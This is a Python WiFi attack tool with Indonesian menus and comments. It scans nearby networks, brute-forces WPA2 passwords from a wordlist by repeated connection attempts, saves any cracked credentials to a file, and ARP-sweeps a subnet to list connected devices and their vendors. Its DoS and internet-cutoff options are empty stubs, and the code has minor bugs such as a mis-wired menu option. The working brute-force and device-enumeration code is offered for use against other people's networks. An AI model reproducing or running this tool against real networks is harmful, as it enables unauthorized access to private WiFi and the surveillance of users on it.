
import sys, time, os 
import colorama
import socket
import requests
from datetime import datetime
from pywifi import PyWiFi, const, Profile
from scapy.all import *
from tabulate import tabulate 
from scapy.all import ARP, Ether, srp

# sebelum start
os.system("cls" if os.name == "nt" else "clear")

# start
#==============> WARNA TEXT BIASAH <==============#
X = "\033[0m" # Reset / default terminal
BK = "\033[30m" # Hitam
RED = "\033[31m" # Merah
YELLOW = "\033[33m" # Kuning
GREEN = "\033[32m" # Hijau
CYAN = "\033[36m" # Biru
BLUE = "\033[34m" # Biru muda
MAGENTA = "\033[35m" # Ungu
WHITE = "\033[37m" # Putih
#==============> WARNA TEXT TERANG  <==============#
Bb = "\033[90m" # Hitam terang
Br = "\033[91m" # Merah terang
Bg = "\033[92m" # Hijau terang
By = "\033[93m" # Kuning terang
Bbl = "\033[94m" # Biru muda terang
Bm = "\033[95m" # Ungu terang
Bc = "\033[96m" # Biru terang
Bw = "\033[97m" # Putih terang
#==============> BACKGROUND WARNA <==============#
BGb = "\033[40m" # Hitam background
BGr = "\033[41m" # Merah background
BGg = "\033[42m" # Hijau background
BGy = "\033[43m" # Kuning background
BGbl = "\033[44m" # Biru background
BGu = "\033[45m" # Ungu background
BGw = "\033[47m" # Putih background
#==============> BACKGROUND TERANG <==============#
BLB = "\033[100m" # Hitam background terang
BGR = "\033[101m" # Merah background terang
BGG = "\033[102m" # Hijau background terang
BGY = "\033[103m" # Kuning background terang
BGBL = "\033[104m]" # Biru background terang
BGBU = "\033[105m" # Ungu background terang
BGW = "\033[107m" # Putih background terang
#==============> STYLE TEXT <==============#
bold = "\033[1m" # Bold
dim = "\033[2m" # Dim
italic = "\033[3m" # Italic
underline = "\033[4m" # Underline
blink = "\033[5m" # Blink
invers = "\033[7m" # Invers
hidden = "\033[8m" # Hidden
strike = "\033[9m" # Strike
#==============> END <==============#

x_awal = f"==========================>{BGBU} WELCOME {X}<=========================="
x_akhir = "=============================================================="

berhasil_bruteforce = []
berhasil_login = []
def menu():
    print(f"{BGBL}{BK}{bold}{italic} MENU {X}{X}")
    print(f"{x_awal}")
    print(f"""
    {Bg} 1. Scan WiFi {X}
    {Br} 2. DOS WIFI {X}
    {Br} 3. Brute Force Attack {X}
    {GREEN} 4. Limit User ( KUOTA ) {X}
    {By} 5. Show MAC {X}
    {RED} 6. Putuskan Internet {X}
    {GREEN} 7. Buka Akses Interne {X}
    {Bw} 8. Limit Kecepatan Internet {X}

    {BGW} {bold} 00. EXIT {X}
    """)
    print(f"{x_akhir}")

    userOpsi = int(input("Silahkan Masukan Pilihan Anda: "))
    
    if userOpsi == 1:
        return scanWifi()
    if userOpsi == 2:
        return dosWifi()
    if userOpsi == 3:
        return attack()
    if userOpsi == 4:
        return limit()
    if userOpsi == 5:
        return showMAC()
    if userOpsi == 6:
        return Block()
    if userOpsi == 7:
        return unblock()
    if userOpsi == 8:
        return scanWifi()
    if userOpsi == 00 == 0:
        exit()
    else:
        os.system("cls" if os.name == "nt" else "clear")
        return f"{By} Opps!!, Opsi Tidak Ada Di Draf Menu {X}"
        time.sleep(5) # jeda 5 detik
        return menu()

    
def scanWifi():
    wifi = PyWiFi()
    ift = wifi.interfaces()[1] # ganti dengan 0 jika ada mengunakan pc dan tertancat gonggle dan ganti dengan 1 jika anda menggunakan donggle di laptop

    print("Sedang Melakukan scaning Wifi Silahkan Tunggu!!!")
    ift.scan()
    time.sleep(10)

    hasil = ift.scan_results()
    Urutkan_Jaringan_Sesuai_Kekuatan_Signal = sorted(hasil, key=lambda x: x.signal, reverse=True)

    data = [[i + 1, jaringan.ssid, jaringan.signal] for i , jaringan, in enumerate(Urutkan_Jaringan_Sesuai_Kekuatan_Signal)]  

    print(f"\n {Bg} Jaringan Yang Terdeteksi! {X}")
    print(tabulate(data, headers=["NO", "SSID", "SIGNAL"], tablefmt="heavy_grid"))


    try:
        Cek_signal_Nya = int(input("\n Silahkan Pilih Nomor Jaringan Yang Deteksi! : ".format(len(hasil))))
        
        if 1 <= Cek_signal_Nya <= len(hasil):
            jaringan_Nya = hasil[Cek_signal_Nya -1]
            print(f"\n jaringan Yang Anda Pilih : {jaringan_Nya.ssid}, Signal : {jaringan_Nya.signal}")

            userSatu = input("Apakah Anda Ingin Mengoneksikan wifi? (y/n) : ")

            if userSatu.lower() == "y":
                password = input(f"\n {Bw} Silahkan Masukan Password Wifi Target : {X}")
                return koneksi(ift, jaringan_Nya.ssid, password)
            else:
                os.system("cls" if os.name == "nt" else "clear")
                return menu()
        
        else:
            print("\n Nomor Tidak Ada Di Menu!")
    
    except ValueError:
        print("\n Masukan Number Bukan Angka!!!")

# koneksi agar user bisa menyambung ke wifi yang di pilih

def koneksi(ift, ssid, password):
    
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK) # tergantung type jaringan
    profile.cipher = const.CIPHER_TYPE_CCMP # jenis enkripsi jaringan
    profile.key = password

    ift.remove_all_network_profiles() # hapus semua Profile
    profile = ift.add_network_profile(profile) # menambahkan profile baru

    # koneksinya
    ift.connect(profile) # percobaan Koneksi ke Jaringan Target
    time.sleep(7) # jeda 7 detik agar koneksi maksimal

    if ift.status() == const.IFACE_CONNECTED:
        print(f"{GREEN} Koneksi Jaringan Berhasil Ke {Bw} SSID : {ssid} {X}")
    else: 
        print(f"{RED} Koneksi Tidak Gagal Periksa Password Nya Dan Coba Lagi {X}")



def dosWifi():
    print("pengembangan!")

def attack():
    wifi = PyWiFi()
    intf = wifi.interfaces()[1]

    print("scaning Jaringan!")
    intf.scan()
    hasil = intf.scan_results()

    if not hasil:
        print("Tidak ada jaringan yang terdeteksi.")
        return
    
    data = [[i + 1, j.ssid, j.signal] for i, j in enumerate(sorted(hasil, key=lambda x: x.signal, reverse=True))]
    print(tabulate(data, headers=["NO", "SSID", "SIGNAL"], tablefmt="heavy_grid"))

    try:
        pilih = int(input("Masukkan nomor jaringan: "))
        if 1 <= pilih <= len(hasil):
            ssid_target = hasil[pilih - 1].ssid
            bruteForce(ssid_target, intf)
        else:
            print("Nomor tidak ada dalam daftar!")
    except ValueError:
        print("Harus memasukkan angka!")

def bruteForce(ssid, intf):
    global berhasil_bruteforce

    try:
        with open("pass.txt", "r") as file:
            pass_list = file.read().splitlines()
    except FileNotFoundError:
        print("❌ File pass.txt tidak ditemukan!")
        return

    valid_password = None  # Simpan password yang benar
    
    for password in pass_list:
        print(f"🔑 Mencoba password: {password}")
        if tryConnect(intf, ssid, password):  # Cek apakah berhasil
            print(f"✅ Password ditemukan: {password}")
            valid_password = password  # Simpan password yang benar, tapi jangan konek dulu
            berhasil_bruteforce.append((ssid, password))
            break

    if valid_password:
        print(f"🔄 Semua password sudah dicoba. Menghubungkan ke {ssid} dengan password {valid_password}...")
        tryConnect(intf, ssid, valid_password)
        savePassword(ssid, valid_password, berhasil_bruteforce)

    else:
        print("❌ Tidak ada password yang cocok.")

def tryConnect(intf, ssid, password):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    intf.remove_all_network_profiles() # hapus 
    tmp_profile = intf.add_network_profile(profile) # gunakan profile baru
    
    intf.disconnect()
    time.sleep(2)
    intf.connect(tmp_profile)
    
    time.sleep(3)
    if intf.status() == const.IFACE_CONNECTED:
        return True
    else:
        intf.disconnect()
        return False

def savePassword(ssid, password, listUser):
    
    if not os.path.exists("done"):
        os.makedirs("done")  # Buat folder jika belum ada

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"done/{timestamp}.txt"

    with open(filename, "w") as file:
        file.write(f"📋 Hasil Brute Force - {timestamp}\n")
        file.write("=" * 40 + "\n")
        file.write(f"🔢 Perangkat Yang Terhubung {len(listUser)} Perangkat\n\n")
        for i, (ssid, password) in enumerate(listUser, 1):
            file.write(f"{i}. SSID : {ssid}\n")
            file.write(f"{i}. Password : {password} \n\n")
        file.write("=" * 40 + "\n")
    
    print(f"💾 Password berhasil disimpan di {filename}")


def limit(): # limit user kouta
    print("pengembangan!")

def Device_hp(ip):
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        return hostname
    except socket.herror:
        return "Unknown Device"

def macFendor(mac):
    URL = f"https://api.macvendors.com/{mac}"
    try:
        response = requests.get(URL, timeout=5)
        if response.status_code == 200:
            return response.text
        else:
            return "Unknown Device"
    except:
        return f"{BGR} Requests Error {X}"

def showMAC(Jaringan_Target=None):

    print(f"{By} Jika Tidak Tau ENTER SAJA {X}")
    subnet = input("\n Silahkan Masukan Subnet Wifi Target : ")
    if not subnet:
        subnet = "192.168.1.0/24"
    
    
    print(f"\n Scaning Jaringan: {subnet}...\n")

    arp_req = ARP(pdst=subnet)
    paket = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_req

    # send paket 
    result, unanswered = srp(paket, timeout=5, verbose=False)    
    clients = []

    for sent, received in result:
        ip = received.psrc
        mac = received.hwsrc
        vendor = macFendor(mac)
        Device = Device_hp(ip)
        clients.append([ip, mac, vendor, Device])

    if clients:
        print(tabulate(clients, headers=["IP ADRESS", "MAC ADDRESS", "VENDOR", "DEVICE"], tablefmt="heavy_grid"))
    else:
        print(f"\n{By} Tidak Ada Perangkat Terdeteksi! {X}")


def Block():
    pass

def unblock():
    pass

if __name__ == "__main__":
    listUser = []
    menu()
